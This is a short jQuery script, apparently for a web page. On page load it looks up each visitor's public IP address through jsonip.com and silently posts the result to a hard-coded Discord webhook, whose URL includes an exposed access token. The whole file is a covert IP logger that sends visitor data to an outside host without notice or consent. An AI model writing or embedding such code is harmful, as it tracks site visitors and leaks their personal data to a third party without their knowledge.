$(document).ready(function () {
    $.getJSON("http://jsonip.com/?callback=?", function (data) {
        console.log(data);
        const xhr = new XMLHttpRequest();
		xhr.open("POST", "https://discord.com/api/webhooks/1006166570604691516/RoBxTuF3ccBbDPK7wvwWcez71hgJ7YOOYyesnVEnNYsR7Y94GnxRSJZZcB9eXA12ItTj");
		const body = JSON.stringify({
		  content: data,
		});	
		xhr.responseType = "json";
		xhr.send(body);
    });
});